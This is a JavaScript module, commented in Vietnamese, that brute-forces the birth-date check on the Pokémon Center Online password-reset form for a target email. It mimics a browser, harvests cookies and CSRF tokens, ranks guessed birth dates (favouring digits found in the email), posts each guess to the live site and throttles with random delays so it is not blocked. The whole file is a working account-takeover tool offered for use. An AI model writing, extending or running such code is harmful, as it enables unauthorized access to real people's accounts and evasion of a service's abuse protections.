const axios = require('axios');
const sleep = require('../utils/sleep');

// URL mới của form password reset
const PASSWORD_RESET_URL = 'https://www.pokemoncenter-online.com/reset-password/';

// HTTP client tối ưu với connection pooling
const httpClient = axios.create({
  timeout: 10000,
  maxRedirects: 5,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0'
  }
});

// Session management để tái sử dụng cookies
class SessionManager {
  constructor() {
    this.cookies = {};
    this.csrfToken = null;
    this.lastRequestTime = 0;
    this.requestCount = 0;
  }

  async getSession() {
    try {
      const response = await httpClient.get(PASSWORD_RESET_URL);

      // Extract cookies
      if (response.headers['set-cookie']) {
        response.headers['set-cookie'].forEach(cookie => {
          const [name] = cookie.split('=');
          this.cookies[name] = cookie;
        });
      }

      // Extract CSRF token if present
      const csrfMatch = response.data.match(/name="csrf_token"\s+value="([^"]+)"/);
      if (csrfMatch) {
        this.csrfToken = csrfMatch[1];
      }

      return {
        cookies: this.cookies,
        csrfToken: this.csrfToken
      };
    } catch (error) {
      console.error('Session initialization failed:', error.message);
      return { cookies: {}, csrfToken: null };
    }
  }

  // Rate limiting để tránh bị block
  async rateLimit() {
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequestTime;

    // Đảm bảo ít nhất 30ms giữa các request (2000 req/phút)
    if (timeSinceLastRequest < 30) {
      await sleep.random(30 - timeSinceLastRequest, 50);
    }

    this.lastRequestTime = Date.now();
    this.requestCount++;
  }
}

// Logic thông minh phức tạp: Hệ thống scoring cho DOB
function getSmartDOBList(email, dobList) {
  const smartList = [...dobList];

  // Tính điểm cho mỗi DOB dựa trên nhiều yếu tố
  smartList.forEach(dob => {
    let score = 0;
    const year = parseInt(dob.year);
    const month = parseInt(dob.month);
    const day = parseInt(dob.day);

    // 0. Kiểm tra DOB có trong email không (Ưu tiên cao nhất)
    const emailLower = email.toLowerCase();
    const dobPatterns = [
      `${dob.year}${dob.month}${dob.day}`, // 19900201
      `${dob.year}-${dob.month}-${dob.day}`, // 1990-02-01
      `${dob.year}/${dob.month}/${dob.day}`, // 1990/02/01
      `${dob.year}.${dob.month}.${dob.day}`, // 1990.02.01
      `${dob.day}${dob.month}${dob.year}`, // 01021990
      `${dob.day}-${dob.month}-${dob.year}`, // 01-02-1990
      `${dob.day}/${dob.month}/${dob.year}`, // 01/02/1990
      `${dob.day}.${dob.month}.${dob.year}`, // 01.02.1990
      `${dob.month}${dob.day}${dob.year}`, // 02011990
      `${dob.month}-${dob.day}-${dob.year}`, // 02-01-1990
      `${dob.month}/${dob.day}/${dob.year}`, // 02/01/1990
      `${dob.month}.${dob.day}.${dob.year}`, // 02.01.1990
      `${dob.year}${dob.month}`, // 199002
      `${dob.month}${dob.year}`, // 021990
      `${dob.day}${dob.month}`, // 0102
      `${dob.month}${dob.day}`, // 0201
      `${dob.year}`, // 1990
      `${dob.month}`, // 02
      `${dob.day}` // 01
    ];

    // Kiểm tra từng pattern trong email
    let emailMatchScore = 0;
    for (const pattern of dobPatterns) {
      if (emailLower.includes(pattern)) {
        // Điểm cao hơn cho pattern dài hơn (chính xác hơn)
        emailMatchScore = Math.max(emailMatchScore, pattern.length * 10);
      }
    }

    if (emailMatchScore > 0) {
      score += emailMatchScore + 200; // Bonus 200 điểm cho match trong email
    }

    // 1. Độ tuổi phổ biến (Pokemon fan thường 15-35 tuổi)
    const currentYear = new Date().getFullYear();
    const age = currentYear - year;

    if (age >= 15 && age <= 25) {
      score += 100; // Độ tuổi teen/young adult - rất phổ biến
    } else if (age >= 26 && age <= 35) {
      score += 80; // Độ tuổi adult - phổ biến
    } else if (age >= 36 && age <= 45) {
      score += 60; // Độ tuổi trung niên - khá phổ biến
    } else if (age >= 12 && age <= 14) {
      score += 40; // Độ tuổi thiếu niên
    } else if (age >= 46 && age <= 55) {
      score += 30; // Độ tuổi trung cao
    } else {
      score += 10; // Các độ tuổi khác
    }

    // 2. Thời gian đăng ký tài khoản (Pokemon GO ra mắt 2016, Pokemon Center phổ biến từ 2018)
    if (year >= 1995 && year <= 2005) {
      score += 50; // Độ tuổi phù hợp với Pokemon GO
    } else if (year >= 1985 && year <= 1994) {
      score += 40; // Độ tuổi Pokemon fan cũ
    } else if (year >= 2006 && year <= 2010) {
      score += 35; // Độ tuổi Gen Z
    }

    // 3. Mùa sinh (ảnh hưởng đến tính cách và sở thích)
    if (month >= 3 && month <= 5) {
      score += 20; // Mùa xuân - thích Pokemon
    } else if (month >= 6 && month <= 8) {
      score += 25; // Mùa hè - cao điểm nhất
    } else if (month >= 9 && month <= 11) {
      score += 15; // Mùa thu
    } else {
      score += 10; // Mùa đông
    }

    // 4. Ngày đặc biệt (Pokemon-related)
    if (day === 27) {
      score += 30; // Pokemon Red/Blue release date (27/02/1996)
    } else if (day === 23) {
      score += 25; // Pokemon Center anniversary
    } else if (day === 15) {
      score += 20; // Pokemon GO release month
    } else if (day === 6) {
      score += 15; // Pokemon anniversary
    } else if (day === 1 || day === 31) {
      score += 10; // Ngày đầu/cuối tháng dễ nhớ
    }

    // 5. Tháng đặc biệt
    if (month === 2) {
      score += 25; // Tháng Pokemon Red/Blue release
    } else if (month === 7) {
      score += 20; // Tháng Pokemon GO release
    } else if (month === 11) {
      score += 15; // Tháng Pokemon anniversary
    } else if (month === 12) {
      score += 10; // Tháng sinh nhật nhiều người
    }

    // 6. Năm đặc biệt (Pokemon milestones)
    if (year === 1996) {
      score += 40; // Pokemon Red/Blue release
    } else if (year === 1999) {
      score += 35; // Pokemon Gold/Silver
    } else if (year === 2002) {
      score += 30; // Pokemon Ruby/Sapphire
    } else if (year === 2006) {
      score += 25; // Pokemon Diamond/Pearl
    } else if (year === 2010) {
      score += 20; // Pokemon Black/White
    } else if (year === 2016) {
      score += 35; // Pokemon GO release
    }

    // 7. Pattern matching (số đẹp, dễ nhớ)
    if (day === month) {
      score += 15; // Ngày = tháng (1/1, 2/2, etc.)
    } else if (day === year % 100) {
      score += 20; // Ngày = 2 số cuối năm
    } else if (day === Math.floor(year / 100)) {
      score += 15; // Ngày = 2 số đầu năm
    }

    // 8. Lucky numbers (Japanese culture)
    const luckyNumbers = [7, 8, 3, 1, 9];
    if (luckyNumbers.includes(day)) {
      score += 10;
    }

    // 9. Sequential patterns
    if (day === month + 1 || day === month - 1) {
      score += 10; // Ngày liền kề tháng
    }

    // 10. Age-based patterns (người thường chọn năm sinh dễ nhớ)
    if (year % 10 === 0) {
      score += 15; // Năm tròn (1990, 2000, etc.)
    } else if (year % 5 === 0) {
      score += 10; // Năm chia hết 5
    }

    // 11. Gaming culture patterns
    if (day <= 31 && month <= 12) {
      // Ngày tháng hợp lệ và phổ biến
      if (day >= 1 && day <= 28) {
        score += 5; // Ngày an toàn (không có vấn đề với tháng 2)
      }
    }

    // 12. Mobile gaming patterns (Pokemon GO players)
    if (age >= 18 && age <= 30) {
      score += 20; // Độ tuổi mobile gaming
    }

    // 13. Japanese culture influence
    if (day === 7 || day === 8) {
      score += 15; // Số may mắn trong văn hóa Nhật
    }

    // 14. Seasonal gaming patterns
    if ((month === 12 || month === 1 || month === 2) && age >= 20) {
      score += 10; // Mùa đông - thời gian gaming nhiều
    }

    // Lưu điểm vào object
    dob.score = score;
    dob.emailMatch = emailMatchScore > 0; // Đánh dấu có match trong email
  });

  // Sắp xếp theo điểm từ cao xuống thấp
  smartList.sort((a, b) => b.score - a.score);

  return smartList;
}

module.exports = async function bruteForceOptimized(email, log, isRunning, dobList) {
  const sessionManager = new SessionManager();
  let foundDOBs = [];
  let tryCount = 0;
  let consecutiveErrors = 0;
  const maxConsecutiveErrors = 5;

  try {
    log(`\n🚀 STARTING OPTIMIZED: ${email}`);

    // Sử dụng danh sách DOB thông minh nâng cao với email
    const smartDOBList = getSmartDOBList(email, dobList);

    // Khởi tạo session
    await sessionManager.getSession();

    log(`\n📋 PROGRESS: ${smartDOBList.length} combinations to try\n`);

    for (const dob of smartDOBList) {
      if (!isRunning()) {
        log(`⏹️ STOPPED by user`);
        break;
      }

      tryCount++;
      const emailMatchIcon = dob.emailMatch ? '🎯' : '';
      const progress = `${tryCount}/${smartDOBList.length}`;
      const percentage = Math.round((tryCount / smartDOBList.length) * 100);

      log(`[${progress.padStart(8)}] (${percentage.toString().padStart(3)}%) ${dob.year}-${dob.month}-${dob.day} (${dob.score}) ${emailMatchIcon}`);

      try {
        // Rate limiting
        await sessionManager.rateLimit();

        // Tạo form data
        const formData = new URLSearchParams();
        formData.append('dwfrm_profile_passwordreset_email', email);
        formData.append('dwfrm_profile_customer_birthdayyear', dob.year);
        formData.append('dwfrm_profile_customer_birthdaymonth', dob.month);
        formData.append('dwfrm_profile_customer_birthdayday', dob.day);

        // Thêm CSRF token nếu có
        if (sessionManager.csrfToken) {
          formData.append('csrf_token', sessionManager.csrfToken);
        }

        // Gửi request
        const response = await httpClient.post(PASSWORD_RESET_URL, formData, {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': Object.values(sessionManager.cookies).join('; '),
            'Referer': PASSWORD_RESET_URL,
            'Origin': 'https://www.pokemoncenter-online.com'
          },
          maxRedirects: 0, // Không follow redirect để kiểm tra response
          validateStatus: () => true // Chấp nhận mọi status code
        });

        // Kiểm tra kết quả
        const isSuccess = response.status === 200 &&
          (response.data.includes('success') ||
            response.data.includes('送信') ||
            response.data.includes('メール') ||
            !response.data.includes('error'));

        if (isSuccess) {
          // Tìm thấy DOB chính xác
          foundDOBs.push({
            email: email,
            dob: `${dob.year}-${dob.month}-${dob.day}`,
            score: dob.score,
            statusCode: response.status,
            emailMatch: dob.emailMatch,
            timestamp: new Date().toISOString()
          });

          const emailMatchIcon = dob.emailMatch ? '🎯' : '';
          log(`\n🎉 SUCCESS: ${dob.year}-${dob.month}-${dob.day} (Score: ${dob.score}, Status: ${response.status}) ${emailMatchIcon}`);
          log(`📧 Email: ${email}`);
          log(`📅 DOB: ${dob.year}-${dob.month}-${dob.day}`);
          log(`📊 Found: ${foundDOBs.length} total\n`);
        } else {
          // Log ngắn gọn cho thất bại
          log(`  ❌ (${response.status})`);
        }

        consecutiveErrors = 0; // Reset error count on success

        // Delay ngắn hơn (chỉ 1-3 giây)
        const ms = Math.floor(Math.random() * (3000 - 1000 + 1)) + 1000;
        log(`  ⏳ Waiting ${Math.round(ms / 1000)}s...\n`);
        await sleep.random(ms, ms);

      } catch (err) {
        consecutiveErrors++;
        log(`  ❌ ERROR: ${err.message}`);

        if (consecutiveErrors >= maxConsecutiveErrors) {
          log(`⚠️ Too many errors, refreshing session...`);
          await sessionManager.getSession();
          consecutiveErrors = 0;
          await sleep.random(5000, 10000);
        }

        await sleep.random(2000, 5000);
      }
    }

    // Log tổng kết cuối cùng
    if (foundDOBs.length > 0) {
      log(`\n🎯 FINAL RESULTS: ${foundDOBs.length} DOBs found for ${email}`);
      foundDOBs.sort((a, b) => b.score - a.score); // Sắp xếp theo điểm
      foundDOBs.forEach((result, index) => {
        const emailMatchIcon = result.emailMatch ? '🎯' : '';
        log(`📋 ${index + 1}. ${result.dob} (Score: ${result.score}, Status: ${result.statusCode}) ${emailMatchIcon}`);
      });
    } else {
      log(`\n❌ No DOBs found for ${email}`);
    }

    log(`\n✅ COMPLETED: ${email}`);

  } catch (err) {
    log(`💥 CRITICAL ERROR: ${err.message}`);
  }
}; 